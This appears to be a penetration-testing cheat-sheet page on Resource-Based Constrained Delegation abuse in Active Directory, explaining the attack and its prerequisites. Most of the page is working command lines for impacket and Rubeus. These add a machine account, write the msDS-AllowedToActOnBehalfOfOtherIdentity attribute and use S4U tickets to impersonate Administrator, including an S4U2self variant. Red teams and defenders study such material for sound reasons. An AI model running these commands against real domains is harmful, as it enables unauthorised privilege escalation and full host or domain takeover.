# Resource-Based Constrained Delegation

RBCD moves the delegation setting onto the target object. If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer — via an ACL edge or a relayed LDAP authentication — you can make an account you control delegate to it, then impersonate anyone.

## Why It Works

Unlike classic constrained delegation, RBCD is set on the resource, not the delegated account. Any principal with write access to the computer object can configure it, which turns a great many ACL edges into full host compromise.

## Prerequisites

* Write access to the target computer object, or an LDAP relay primitive
* A controlled account with an SPN (or the ability to add a computer account)

## Execution

**Resource-Based Constrained Delegation**

* add computer account
  * `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)
* RBCD With added computer account
  * `Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` [\[tool\]](https://github.com/GhostPack/Rubeus)
      * **→ Admin**
  * `rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
    * `getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getST.py)
      * **→ Kerberos TGT**
        * **→ Admin**

**S4U2self abuse**

* Get machine account (X)'s TGT
  * Get a ST on X as user admin
* `getTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>" "<domain>"/"<machine>$"` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
  * `getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>" -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getST.py)
    * **→ Admin**

{% hint style="info" %}
Adding a computer account works by default: `ms-DS-MachineAccountQuota` is 10 for authenticated users unless an administrator has set it to 0.
{% endhint %}

## Related

* [NTLM Relay](file:///9685693/coercion-relay/ntlm-relay.md) — relaying to LDAP to set the attribute
* [Rights on Computers & OUs](file:///9685693/acl-abuse/rights-on-computers-and-ous.md) — the ACL edges that permit it
